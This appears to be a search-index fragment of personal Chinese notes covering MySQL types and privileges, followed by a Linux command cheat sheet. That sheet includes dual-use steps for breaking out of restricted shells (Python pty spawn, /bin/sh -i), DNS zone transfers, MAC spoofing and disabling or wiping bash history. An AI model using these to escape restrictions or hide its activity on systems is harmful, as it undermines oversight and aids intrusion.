TEXT \u5c0f\u7684\u975e\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 L+2\u5b57\u8282\uff0c\u5728\u6b64\uff0cL&lt;2^16 MEDIUMTEXT \u4e2d\u7b49\u5927\u5c0f\u7684\u975e\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 L+3\u5b57\u8282\uff0c\u5728\u6b64\uff0cL&lt;2^24 LONGTEXT \u5927\u7684\u975e\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 L+4\u5b57\u8282\uff0c\u5728\u6b64\uff0cL&lt;2^32 ENUM \u679a\u4e3e\u7c7b\u578b\uff0c\u53ea\u80fd\u6709\u4e00\u4e2a\u679a\u4e3e\u5b57\u7b26\u4e32\u503c 1\u62162\u4e2a\u5b57\u8282\uff0c\u53d6\u51b3\u4e8e\u679a\u4e3e\u503c\u7684\u6570\u76ee (\u6700\u5927\u503c\u4e3a65535) SET \u4e00\u4e2a\u8bbe\u7f6e\uff0c\u5b57\u7b26\u4e32\u5bf9\u8c61\u53ef\u4ee5\u6709\u96f6\u4e2a\u6216 \u591a\u4e2aSET\u6210\u5458 1\u30012\u30013\u30014\u62168\u4e2a\u5b57\u8282\uff0c\u53d6\u51b3\u4e8e\u96c6\u5408 \u6210\u5458\u7684\u6570\u91cf\uff08\u6700\u591a64\u4e2a\u6210\u5458\uff09"},{"location":"program/2024-04-22-MYSQL/#_96","title":"\u4e8c\u8fdb\u5236\u7c7b\u578b","text":"\u7c7b\u578b\u540d\u79f0 \u8bf4\u660e \u5b58\u50a8\u9700\u6c42 BIT(M) \u4f4d\u5b57\u6bb5\u7c7b\u578b \u5927\u7ea6 (M+7)/8 \u5b57\u8282 BINARY(M) \u56fa\u5b9a\u957f\u5ea6\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 M \u5b57\u8282 VARBINARY (M) \u53ef\u53d8\u957f\u5ea6\u4e8c\u8fdb\u5236\u5b57\u7b26\u4e32 M+1 \u5b57\u8282 TINYBLOB (M) \u975e\u5e38\u5c0f\u7684BLOB L+1 \u5b57\u8282\uff0c\u5728\u6b64\uff0cL&lt;2^8 BLOB (M) \u5c0f BLOB L+2 \u5b57\u8282\uff0c\u5728\u6b64\uff0cL&lt;2^16 MEDIUMBLOB (M) \u4e2d\u7b49\u5927\u5c0f\u7684BLOB L+3 \u5b57\u8282\uff0c\u5728\u6b64\uff0cL&lt;2^24 LONGBLOB (M) \u975e\u5e38\u5927\u7684BLOB L+4 \u5b57\u8282\uff0c\u5728\u6b64\uff0cL&lt;2^32"},{"location":"program/2024-04-22-MYSQL/#_97","title":"\u6743\u9650\u4e00\u89c8\u8868","text":"<p>\u5177\u4f53\u6743\u9650\u7684\u4f5c\u7528\u8be6\u89c1\u5b98\u65b9\u6587\u6863</p> <p>GRANT \u548c REVOKE \u5141\u8bb8\u7684\u9759\u6001\u6743\u9650</p> Privilege Grant Table Column Context <code>ALL [PRIVILEGES]</code> Synonym for \u201call privileges\u201d Server administration <code>ALTER</code> <code>Alter_priv</code> Tables <code>ALTER ROUTINE</code> <code>Alter_routine_priv</code> Stored routines <code>CREATE</code> <code>Create_priv</code> Databases, tables, or indexes <code>CREATE ROLE</code> <code>Create_role_priv</code> Server administration <code>CREATE ROUTINE</code> <code>Create_routine_priv</code> Stored routines <code>CREATE TABLESPACE</code> <code>Create_tablespace_priv</code> Server administration <code>CREATE TEMPORARY TABLES</code> <code>Create_tmp_table_priv</code> Tables <code>CREATE USER</code> <code>Create_user_priv</code> Server administration <code>CREATE VIEW</code> <code>Create_view_priv</code> Views <code>DELETE</code> <code>Delete_priv</code> Tables <code>DROP</code> <code>Drop_priv</code> Databases, tables, or views <code>DROP ROLE</code> <code>Drop_role_priv</code> Server administration <code>EVENT</code> <code>Event_priv</code> Databases <code>EXECUTE</code> <code>Execute_priv</code> Stored routines <code>FILE</code> <code>File_priv</code> File access on server host <code>GRANT OPTION</code> <code>Grant_priv</code> Databases, tables, or stored routines <code>INDEX</code> <code>Index_priv</code> Tables <code>INSERT</code> <code>Insert_priv</code> Tables or columns <code>LOCK TABLES</code> <code>Lock_tables_priv</code> Databases <code>PROCESS</code> <code>Process_priv</code> Server administration <code>PROXY</code> See <code>proxies_priv</code> table Server administration <code>REFERENCES</code> <code>References_priv</code> Databases or tables <code>RELOAD</code> <code>Reload_priv</code> Server administration <code>REPLICATION CLIENT</code> <code>Repl_client_priv</code> Server administration <code>REPLICATION SLAVE</code> <code>Repl_slave_priv</code> Server administration <code>SELECT</code> <code>Select_priv</code> Tables or columns <code>SHOW DATABASES</code> <code>Show_db_priv</code> Server administration <code>SHOW VIEW</code> <code>Show_view_priv</code> Views <code>SHUTDOWN</code> <code>Shutdown_priv</code> Server administration <code>SUPER</code> <code>Super_priv</code> Server administration <code>TRIGGER</code> <code>Trigger_priv</code> Tables <code>UPDATE</code> <code>Update_priv</code> Tables or columns <code>USAGE</code> Synonym for \u201cno privileges\u201d Server administration <p>GRANT \u548c REVOKE \u5141\u8bb8\u7684\u52a8\u6001\u6743\u9650</p> Privilege Context <code>APPLICATION_PASSWORD_ADMIN</code> Dual password administration <code>AUDIT_ABORT_EXEMPT</code> Allow queries blocked by audit log filter <code>AUDIT_ADMIN</code> Audit log administration <code>AUTHENTICATION_POLICY_ADMIN</code> Authentication administration <code>BACKUP_ADMIN</code> Backup administration <code>BINLOG_ADMIN</code> Backup and Replication administration <code>BINLOG_ENCRYPTION_ADMIN</code> Backup and Replication administration <code>CLONE_ADMIN</code> Clone administration <code>CONNECTION_ADMIN</code> Server administration <code>ENCRYPTION_KEY_ADMIN</code> Server administration <code>FIREWALL_ADMIN</code> Firewall administration <code>FIREWALL_EXEMPT</code> Firewall administration <code>FIREWALL_USER</code> Firewall administration <code>FLUSH_OPTIMIZER_COSTS</code> Server administration <code>FLUSH_STATUS</code> Server administration <code>FLUSH_TABLES</code> Server administration <code>FLUSH_USER_RESOURCES</code> Server administration <code>GROUP_REPLICATION_ADMIN</code> Replication administration <code>GROUP_REPLICATION_STREAM</code> Replication administration <code>INNODB_REDO_LOG_ARCHIVE</code> Redo log archiving administration <code>NDB_STORED_USER</code> NDB Cluster <code>PASSWORDLESS_USER_ADMIN</code> Authentication administration <code>PERSIST_RO_VARIABLES_ADMIN</code> Server administration <code>REPLICATION_APPLIER</code> <code>PRIVILEGE_CHECKS_USER</code> for a replication channel <code>REPLICATION_SLAVE_ADMIN</code> Replication administration <code>RESOURCE_GROUP_ADMIN</code> Resource group administration <code>RESOURCE_GROUP_USER</code> Resource group administration <code>ROLE_ADMIN</code> Server administration <code>SESSION_VARIABLES_ADMIN</code> Server administration <code>SET_USER_ID</code> Server administration <code>SHOW_ROUTINE</code> Server administration <code>SYSTEM_USER</code> Server administration <code>SYSTEM_VARIABLES_ADMIN</code> Server administration <code>TABLE_ENCRYPTION_ADMIN</code> Server administration <code>VERSION_TOKEN_ADMIN</code> Server administration <code>XA_RECOVER_ADMIN</code> Server administration"},{"location":"program/2024-04-22-MYSQL/#_98","title":"\u56fe\u5f62\u5316\u754c\u9762\u5de5\u5177","text":"<ul> <li>Workbench(\u514d\u8d39): http://dev.mysql.com/downloads/workbench/</li> <li>navicat(\u6536\u8d39\uff0c\u8bd5\u7528\u724830\u5929): https://www.navicat.com/en/download/navicat-for-mysql</li> <li>Sequel Pro(\u5f00\u6e90\u514d\u8d39\uff0c\u4ec5\u652f\u6301Mac OS): http://www.sequelpro.com/</li> <li>HeidiSQL(\u514d\u8d39): http://www.heidisql.com/</li> <li>phpMyAdmin(\u514d\u8d39): https://www.phpmyadmin.net/</li> <li>SQLyog: https://sqlyog.en.softonic.com/</li> </ul>"},{"location":"program/2024-04-22-MYSQL/#_99","title":"\u5b89\u88c5","text":""},{"location":"program/2024-04-22-MYSQL/#_100","title":"\u5c0f\u6280\u5de7","text":"<ol> <li>\u5728SQL\u8bed\u53e5\u4e4b\u540e\u52a0\u4e0a<code>\\G</code>\u4f1a\u5c06\u7ed3\u679c\u7684\u8868\u683c\u5f62\u5f0f\u8f6c\u6362\u6210\u884c\u6587\u672c\u5f62\u5f0f</li> <li>\u67e5\u770bMysql\u6570\u636e\u5e93\u5360\u7528\u7a7a\u95f4\uff1a MySQL<pre><code>SELECT table_schema \"Database Name\"\n     , SUM(data_length + index_length) / (1024 * 1024) \"Database Size in MB\"\nFROM information_schema.TABLES\nGROUP BY table_schema;\n</code></pre></li> </ol>"},{"location":"program/2024-04-22-MYSQL/#_101","title":"\u53c2\u8003\u6587\u732e","text":"<p>https://dhc.pythonanywhere.com/entry/share/?key=3ad29aad765a2b98b2b2a745d71bef715507ee9db8adbec98257bac0ad84cbe4#h1-u6743u9650u4E00u89C8u8868 \u8fd9\u7bc7\u7b14\u8bb0\u662f\u5728\u522b\u4eba\u7684\u57fa\u7840\u4e0a\u5b8c\u5584\u800c\u6765\uff0c\u611f\u8c22B\u7ad9\u7684\u9ed1\u9a6c\u7a0b\u5e8f\u5458up\u4e3b\uff0c\u4e5f\u611f\u8c22\u8def\u9014\u535a\u5ba2\u3002</p>"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","title":"Linux\u5e38\u7528\u547d\u4ee4","text":""},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_1","title":"\u7f51\u7edc\u76f8\u5173\u547d\u4ee4","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>netstat -tulpn</code> \u5728 Linux \u4e2d\u663e\u793a\u5bf9\u5e94\u4e86\u8fdb\u7a0bID\uff08PID\uff09\u7684\u7f51\u7edc\u7aef\u53e3\u3002 <code>watch ss -stplu</code> \u901a\u8fc7\u5957\u63a5\u5b57\u5b9e\u65f6\u89c2\u5bdf TCP, UDP \u7aef\u53e3\u3002 <code>lsof -i</code> \u663e\u793a\u786e\u8ba4\u4e86\u7684\u8fde\u63a5\u3002 <code>macchanger -m MACADDR INTR</code> \u5728 KALI Linux \u4e0a\u4fee\u6539 MAC \u5730\u5740\u3002 <code>ifconfig eth0 192.168.2.1/24</code> \u5728 Linux \u4e2d\u8bbe\u7f6e ID \u5730\u5740\u3002 <code>ifconfig eth0:1 192.168.2.3/24</code> \u5728 Linux \u4e2d\u5411\u73b0\u6709\u7684\u7f51\u7edc\u63a5\u53e3\u6dfb\u52a0 IP \u5730\u5740\u3002 <code>ifconfig eth0 hw ether MACADDR</code> \u4f7f\u7528 ifconfig \u4fee\u6539 Linux \u4e2d\u7684 MAC \u5730\u5740\u3002 <code>ifconfig eth0 mtu 1500</code> \u5728 Linux \u4e2d\u4f7f\u7528 ifconfig \u4fee\u6539 MTU \u7684\u5927\u5c0f\uff0c\u5c06 1500 \u6539\u4e3a\u4f60\u60f3\u8981\u7684 MTU\u3002 <code>dig -x 192.168.1.1</code> \u5bf9 IP \u5730\u5740\u8fdb\u884c\u53cd\u5411\u67e5\u627e\u3002 <code>host 192.168.1.1</code> \u5728\u4e00\u4e2a IP \u5730\u5740\u4e0a\u8fdb\u884c\u53cd\u5411\u67e5\u627e\uff0c\u9002\u7528\u4e8e\u6ca1\u6709\u5b89\u88c5 dig \u7684\u60c5\u51b5\u3002 <code>dig @192.168.2.2 domain.com -t AXFR</code> \u4f7f\u7528 dig \u6267\u884c\u4e00\u6b21 DNS \u533a\u57df\u4f20\u8f93\u3002 <code>host -l domain.com nameserver</code> \u4f7f\u7528 host \u6267\u884c\u4e00\u6b21 DNS \u533a\u57df\u4f20\u8f93\u3002 <code>nbtstat -A x.x.x.x</code> \u83b7\u53d6 IP \u5730\u5740\u5bf9\u5e94\u7684\u57df\u540d\u3002 <code>ip addr add 192.168.2.22/24 dev eth0</code> \u5411 Linux \u6dfb\u52a0\u4e00\u4e2a\u9690\u85cf\u7684 IP \u5730\u5740\uff0c\u5728\u6267\u884c ifconfig \u547d\u4ee4\u65f6\u4e0d\u4f1a\u663e\u793a\u8fd9\u4e2a IP \u5730\u5740\u3002 <code>tcpkill -9 host google.com</code> \u963b\u6b62\u4ece\u4e3b\u673a\u8bbf\u95ee google.com\u3002 <code>echo \u201c1\u201d &gt; /proc/sys/net/ipv4/ip_forward</code> \u542f\u7528 IP \u8f6c\u53d1\uff0c\u5c06 Linux \u76d2\u5b50\u53d8\u6210\u4e00\u4e2a\u8def\u7531\u5668\u2014\u2014\u8fd9\u6837\u5c31\u65b9\u4fbf\u901a\u8fc7\u8fd9\u4e2a\u76d2\u5b50\u6765\u8fdb\u884c\u8def\u7531\u6d41\u91cf\u7684\u63a7\u5236\u3002 <code>echo \u201c8.8.8.8\u201d &gt; /etc/resolv.conf</code> \u4f7f\u7528 Google \u7684 DNS\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_2","title":"\u7cfb\u7edf\u4fe1\u606f\u547d\u4ee4","text":"<p>\u5bf9\u672c\u5730\u7684\u679a\u4e3e\u68c0\u67e5\u5f88\u6709\u7528\u3002</p> \u547d\u4ee4 \u63cf\u8ff0 <code>whoami</code> \u663e\u793a Linux \u4e0a\u5f53\u524d\u5df2\u767b\u5f55\u7528\u6237\u3002 <code>id</code> \u5411\u7528\u6237\u663e\u793a\u5f53\u524d\u5df2\u767b\u5f55\u7684\u7528\u6237\u548c\u7ec4\u3002 <code>last</code> \u663e\u793a\u6700\u540e\u4e00\u6b21\u767b\u9646\u7684\u7528\u6237\u3002 <code>mount</code> \u663e\u793a\u5df2\u6302\u8f7d\u7684\u9a71\u52a8\u3002 <code>df -h</code> \u7528\u4eba\u7c7b\u53ef\u8bfb\u7684\u8f93\u51fa\u663e\u793a\u78c1\u76d8\u4f7f\u7528\u60c5\u51b5\u3002 <code>echo \u201cuser:passwd\u201d | chpasswd</code> \u7528\u4e00\u884c\u547d\u4ee4\u91cd\u7f6e\u5bc6\u7801\u3002 <code>getent passwd</code> \u5217\u51fa Linux \u4e0a\u7684\u7528\u6237\u3002 <code>strings /usr/local/bin/blah</code> \u663e\u793a\u975e\u6587\u672c\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u4f8b\u5982\uff1a\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u91cc\u9762\u6709\u4ec0\u4e48\u3002 <code>uname -ar</code> \u663e\u793a\u8fd0\u884c\u4e2d\u7684\u5185\u6838\u7248\u672c\u3002 <code>PATH=$PATH:/my/new-path</code> \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u8def\u5f84\uff0c\u65b9\u4fbf\u8fdb\u884c\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\uff08FS\uff09\u64cd\u4f5c\u3002 <code>history</code> \u663e\u793a\u7528\u6237\u5728\u4e4b\u524d\u6267\u884c\u7684 bash \u811a\u672c\u5386\u53f2\u8bb0\u5f55\uff0c\u8fd8\u6709\u6572\u5165\u7684\u547d\u4ee4\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#redhat-centos-rpm","title":"\u57fa\u4e8e Redhat / CentOS / RPM \u7684\u53d1\u884c\u7248","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>cat /etc/redhat-release</code> \u663e\u793a Redhat / CentOS \u7248\u672c\u53f7\u3002 <code>rpm -qa</code> \u5728\u57fa\u4e8e RPM \u7684 Linux \u4e0a\u5217\u51fa\u6240\u6709\u5df2\u5b89\u88c5\u7684 RPM \u5305\u3002 <code>rpm -q \u2013changelog openvpn</code> \u68c0\u67e5\u5df2\u5b89\u88c5\u7684 RPM \u662f\u5426\u9488\u5bf9 CVE \u6253\u4e86\u8865\u4e01\uff0c\u53ef\u7528 <code>grep</code> \u547d\u4ee4\u8fc7\u6ee4\u8f93\u51fa\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#yum","title":"YUM \u547d\u4ee4","text":"<p>\u57fa\u4e8e RPM \u7684\u7cfb\u7edf\u4f7f\u7528\u4e86\u5305\u7ba1\u7406\u5668, \u4f60\u53ef\u4ee5\u7528\u8fd9\u4e9b\u547d\u4ee4\u83b7\u53d6\u5230\u6709\u5173\u5df2\u5b89\u88c5\u5305\u6216\u8005\u5176\u5b83\u5de5\u5177\u7684\u6709\u7528\u4fe1\u606f\u3002</p> \u547d\u4ee4 \u63cf\u8ff0 <code>yum update</code> \u4f7f\u7528 YUM \u66f4\u65b0\u6240\u6709\u7684 RPM \u5305\uff0c\u5e76\u663e\u793a\u54ea\u4e9b\u5df2\u7ecf\u8fc7\u65f6\u3002 <code>yum update httpd</code> \u66f4\u65b0\u5355\u72ec\u7684\u5305\uff0c\u5982 HTTPD (Apache)\u3002 <code>yum install package</code> \u4f7f\u7528 YUM \u5b89\u88c5\u4e00\u4e2a\u5305\u3002 <code>yum \u2013exclude=package kernel* update</code> \u5728\u4f7f\u7528 YUM \u65f6\u6392\u9664\u67d0\u4e2a\u5305\u4e0d\u66f4\u65b0\u3002 <code>yum remove package</code> \u4f7f\u7528 YUM \u5220\u9664\u5305\u3002 <code>yum erase package</code> \u4f7f\u7528 YUM \u5220\u9664\u5305\u3002 <code>yum list package</code> \u5217\u51fa\u6709\u5173 YUM \u5305\u7684\u4fe1\u606f\u3002 <code>yum provides httpd</code> \u663e\u793a\u5305\u7684\u7528\u9014\uff0c\u4f8b\u5982\uff1aApache HTTPD Server\u3002 <code>yum info httpd</code> \u663e\u793a\u5305\u4fe1\u606f\uff0c\u67b6\u6784\uff0c\u7248\u672c\u7b49\u3002 <code>yum localinstall blah.rpm</code> \u4f7f\u7528 YUM \u5b89\u88c5\u672c\u5730 RPM\uff0c\u4ece\u8d44\u6e90\u5e93\u8fdb\u884c\u5b89\u88c5\u3002 <code>yum deplist package</code> \u663e\u793a\u5305\u7684\u4f9d\u8d56\u4fe1\u606f\u3002 <code>yum list installed | more</code> \u5217\u51fa\u6240\u6709\u5df2\u5b89\u88c5\u7684\u5305\u3002 <code>yum grouplist | more</code> \u663e\u793a\u6240\u6709\u7684 YUM \u5206\u7ec4\u3002 <code>yum groupinstall 'Development Tools'</code> \u5b89\u88c5 YUM \u5206\u7ec4\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#debian-ubuntu-deb","title":"\u57fa\u4e8e Debian / Ubuntu / .deb \u7684\u53d1\u884c\u7248","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>cat /etc/debian_version</code> \u663e\u793a Debian \u7248\u672c\u53f7\u3002 <code>cat /etc/*-release</code> \u663e\u793a Ubuntu \u7248\u672c\u53f7\u3002 <code>dpkg -l</code> \u5728\u57fa\u4e8e Debian / .deb \u7684 Linux \u53d1\u884c\u7248\u4e0a\u5217\u51fa\u6240\u6709\u5df2\u5b89\u88c5\u7684\u5305\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#linux_1","title":"Linux \u7528\u6237\u7ba1\u7406","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>useradd new-user</code> \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 Linux \u7528\u6237\u3002 <code>passwd username</code> \u91cd\u7f6e Linux \u7528\u6237\u5bc6\u7801\u3002\u82e5\u4e3a root \u7528\u6237\uff0c\u53ea\u9700\u8f93\u5165\u5bc6\u7801\u5373\u53ef\u3002 <code>deluser username</code> \u5220\u9664\u4e00\u4e2a Linux \u7528\u6237\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#linux_2","title":"Linux \u89e3\u538b\u7f29\u547d\u4ee4","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>unzip archive.zip</code> \u5728 Linux \u4e0a\u63d0\u53d6 zip \u5305\u4e2d\u7684\u6587\u4ef6\u3002 <code>zipgrep *.txt archive.zip</code> \u5728\u4e00\u4e2a zip \u538b\u7f29\u5305\u4e2d\u641c\u7d22\u3002 <code>tar xf archive.tar</code> \u5728 Linux \u4e0a\u63d0\u53d6 tar \u5305\u4e2d\u7684\u6587\u4ef6\u3002 <code>tar xvzf archive.tar.gz</code> \u5728 Linux \u4e0a\u63d0\u53d6 tar.gz \u5305\u4e2d\u7684\u6587\u4ef6\u3002 <code>tar xjf archive.tar.bz2</code> \u5728 Linux \u4e0a\u63d0\u53d6 tar.bz2 \u5305\u4e2d\u7684\u6587\u4ef6\u3002 <code>tar ztvf file.tar.gz | grep blah</code> \u5728\u4e00\u4e2a tar.gz \u6587\u4ef6\u4e2d\u641c\u7d22\u3002 <code>gzip -d archive.gz</code> \u5728 Linux \u4e0a\u63d0\u53d6 gzip \u4e2d\u7684\u6587\u4ef6\u3002 <code>zcat archive.gz</code> \u5728 Linux \u4e0a\u4e0d\u89e3\u538b\u7f29\u5730\u8bfb\u53d6\u4e00\u4e2a gz \u6587\u4ef6\u3002 <code>zless archive.gz</code> \u7528\u8f83\u5c11\u547d\u4ee4\u5b9e\u73b0\u5bf9 .gz \u538b\u7f29\u5305\u7684\u67e5\u770b\u3002 <code>zgrep 'blah' /var/log/maillog*.gz</code> \u5728 Linux \u4e0a\u5bf9 .gz \u538b\u7f29\u5305\u5185\u5185\u5bb9\u6267\u884c\u641c\u7d22\uff08\u5982\u641c\u7d22\u538b\u7f29\u8fc7\u7684\u65e5\u5fd7\u6587\u4ef6\uff09\u3002 <code>vim file.txt.gz</code> \u4f7f\u7528 vim \u8bfb\u53d6 .txt.gz \u6587\u4ef6\u3002 <code>upx -9 -o output.exe input.exe</code> \u5728 Linux \u4e0a\u4f7f\u7528 UPX \u538b\u7f29 .exe \u6587\u4ef6\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#linux_3","title":"Linux \u538b\u7f29\u547d\u4ee4","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>zip -r file.zip /dir/*</code> \u5728 Linux \u4e0a\u521b\u5efa\u4e00\u4e2a .zip \u6587\u4ef6\u3002 <code>tar cf archive.tar files</code> \u5728 Linux \u4e0a\u521b\u5efa\u4e00\u4e2a tar \u6587\u4ef6\u3002 <code>tar czf archive.tar.gz files</code> \u5728 Linux \u4e0a\u521b\u5efa\u4e00\u4e2a tar.gz \u6587\u4ef6\u3002 <code>tar cjf archive.tar.bz2 files</code> \u5728 Linux \u4e0a\u521b\u5efa\u4e00\u4e2a tar.bz2 \u6587\u4ef6\u3002 <code>gzip file</code> \u5728 Linux \u4e0a\u521b\u5efa\u4e00\u4e2a .gz \u6587\u4ef6\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#linux_4","title":"Linux \u6587\u4ef6\u547d\u4ee4","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>df -h blah</code> \u5728 Linux \u4e0a\u663e\u793a\u6587\u4ef6/\u76ee\u5f55\u7684\u5927\u5c0f\u3002 <code>diff file1 file2</code> \u5728 Linux \u4e0a\u6bd4\u5bf9/\u663e\u793a\u4e24\u4e2a\u6587\u4ef6\u4e4b\u95f4\u7684\u5dee\u522b\u3002 <code>md5sum file</code> \u5728 Linux \u4e0a\u751f\u6210 MD5 \u6458\u8981\u3002 <code>md5sum -c blah.iso.md5</code> \u5728 Linux \u4e0a\u68c0\u67e5\u6587\u4ef6\u7684 MD5 \u6458\u8981\uff0c\u5047\u8bbe\u6587\u4ef6\u548c .md5 \u6587\u4ef6\u5728\u76f8\u540c\u8def\u5f84\u4e0b\u3002 <code>file blah</code> \u5728 Linux \u4e0a\u67e5\u627e\u6587\u4ef6\u7c7b\u578b\uff0c\u5e76\u663e\u793a\u6587\u4ef6\u662f 32 \u4f4d\u8fd8\u662f 64 \u4f4d\u3002 <code>dos2unix</code> \u5c06 Windows \u7684\u884c\u7ed3\u675f\u7b26\u8f6c\u6362\u4e3a Unix/Linux \u7684\u683c\u5f0f\u3002 <code>base64 &lt; input-file &gt; output-file</code> \u5bf9\u8f93\u5165\u6587\u4ef6\u8fdb\u884c Base64 \u7f16\u7801\uff0c\u5e76\u8f93\u51fa\u4e3a\u4e00\u4e2a\u540d\u4e3a output-file \u7684\u6587\u4ef6\u3002 <code>base64 -d &lt; input-file &gt; output-file</code> \u5bf9\u8f93\u5165\u6587\u4ef6\u8fdb\u884c Base64 \u89e3\u7801\uff0c\u5e76\u8f93\u51fa\u4e3a\u4e00\u4e2a\u540d\u4e3a output-file \u7684\u6587\u4ef6\u3002 <code>touch -r ref-file new-file</code> \u4f7f\u7528\u5f15\u7528\u6587\u4ef6\u7684\u65f6\u95f4\u6233\u521b\u5efa\u4e00\u4e2a\u65b0\u6587\u4ef6\u3002 <code>rm -rf</code> \u4e0d\u663e\u793a\u786e\u8ba4\u63d0\u793a\u76f4\u63a5\u5220\u9664\u6587\u4ef6\u548c\u76ee\u5f55\u3002"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#samba","title":"Samba \u547d\u4ee4","text":"<p>\u4ece Linux \u8fde\u63a5\u5230 Samba \u5171\u4eab\u7684\u5e38\u7528\u547d\u4ee4\uff1a</p> <ul> <li>\u8fde\u63a5\u5230 Samba \u5171\u4eab\u5e76\u6302\u8f7d\u5230 <code>/mnt/win</code> \u76ee\u5f55\u4e0b\u3002</li> </ul> Text Only<pre><code>$ smbmount //server/share /mnt/win -o user=username,password=password1\n</code></pre> <ul> <li>\u4ee5 <code>user</code> \u7528\u6237\u8eab\u4efd\u8fde\u63a5\u5230 Samba \u5171\u4eab\u3002</li> </ul> Text Only<pre><code>$ smbclient -U user \\\\\\\\server\\\\share\n</code></pre> <ul> <li>\u4f7f\u7528 CIFS \u6587\u4ef6\u7cfb\u7edf\u7c7b\u578b\u5c06\u7f51\u7edc\u5171\u4eab\u6302\u8f7d\u5230\u672c\u5730 <code>/mnt/share</code> \u76ee\u5f55\u3002</li> </ul> Text Only<pre><code>$ mount -t cifs -o username=user,password=password //x.x.x.x/share /mnt/share\n</code></pre>"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#shell","title":"\u6253\u7834 Shell \u7684\u9650\u5236","text":"<p>\u4e00\u4e9b\u7528\u4e8e\u9003\u907f\u9650\u5236\u7684 Python \u5c0f\u6280\u5de7\uff1a</p> <ul> <li>\u4f7f\u7528 Python \u83b7\u53d6\u4e00\u4e2a\u4ea4\u4e92\u5f0f Bash Shell\u3002</li> </ul> Text Only<pre><code>$ python -c 'import pty;pty.spawn(\"/bin/bash\")'\n</code></pre> <ul> <li>\u4f7f\u7528 Python \u6267\u884c <code>/bin/bash</code> \u547d\u4ee4\u3002</li> </ul> Text Only<pre><code>$ echo os.system('/bin/bash')\n</code></pre> <ul> <li>\u542f\u52a8\u4e00\u4e2a\u4ea4\u4e92\u5f0f Shell\uff08/bin/sh\uff09\u3002</li> </ul> Text Only<pre><code>$ /bin/sh -i\n</code></pre>"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#misc","title":"Misc \u547d\u4ee4","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>init 6</code> \u4ece\u547d\u4ee4\u884c\u91cd\u542f Linux \u3002 <code>gcc -o output.c input.c</code> \u7f16\u8bd1 C \u4ee3\u7801\u3002 <code>gcc -m32 -o output.c input.c</code> \u4ea4\u53c9\u7f16\u8bd1 C \u4ee3\u7801\uff0c\u5728 64 \u4f4d Linux \u4e0a\u5c06\u7f16\u8bd1\u51fa 32 \u4f4d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 <code>unset HISTORYFILE</code> \u5173\u95ed bash \u5386\u53f2\u65e5\u5fd7\u8bb0\u5f55\u529f\u80fd\u3002 <code>rdesktop X.X.X.X</code> \u4ece Linux \u8fde\u63a5\u5230 RDP \u670d\u52a1\u5668\u3002 <code>kill -9 $$</code> \u5173\u95ed\u5f53\u524d\u7684\u4f1a\u8bdd\u3002 <code>chown user:group blah</code> \u4fee\u6539\u6587\u4ef6\u6216\u8005\u76ee\u5f55\u7684\u6240\u6709\u8005\u3002 <code>chown -R user:group blah</code> \u9012\u5f52\u4fee\u6539\u6587\u4ef6\u6216\u76ee\u5f55\u53ca\u5176\u4e0b\u6240\u6709\u6587\u4ef6\u7684\u62e5\u6709\u8005\u3002 <code>chmod 600 file</code> \u4fee\u6539\u6587\u4ef6/\u76ee\u5f55\u7684\u6743\u9650\u8bbe\u5b9a\uff0c\u8be6\u60c5\u89c1 Linux \u6587\u4ef6\u7cfb\u7edf\u6743\u9650\u3002 <code>ssh user@X.X.X.X | cat /dev/null &gt; ~/.bash_history</code> \u6e05\u9664 bash \u5386\u53f2"},{"location":"program/2024-08-17-Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#linux_5","title":"Linux \u6587\u4ef6\u7cfb\u7edf\u6743\u9650","text":"\u53d6\u503c \u610f\u4e49 <code>777</code> <code>rwxrwxrwx</code> \u6ca1\u6709\u9650\u5236\uff0c\u5b8c\u5168\u53ef\u8bfb\u53ef\u5199\u53ef\u6267\u884c\uff08RWX\uff09\uff0c\u7528\u6237\u53ef\u4ee5\u505a\u4efb\u4f55\u4e8b\u60c5\u3002 <code>755</code> <code>rwxr-xr-x</code> \u62e5\u6709\u8005\u53ef\u5b8c\u5168\u8bbf\u95ee\uff0c\u5176\u4ed6\u4eba\u53ea\u80fd\u8bfb\u53d6\u548c\u6267\u884c\u6587\u4ef6\u3002 <code>700</code> <code>rwx\u2014\u2014</code> 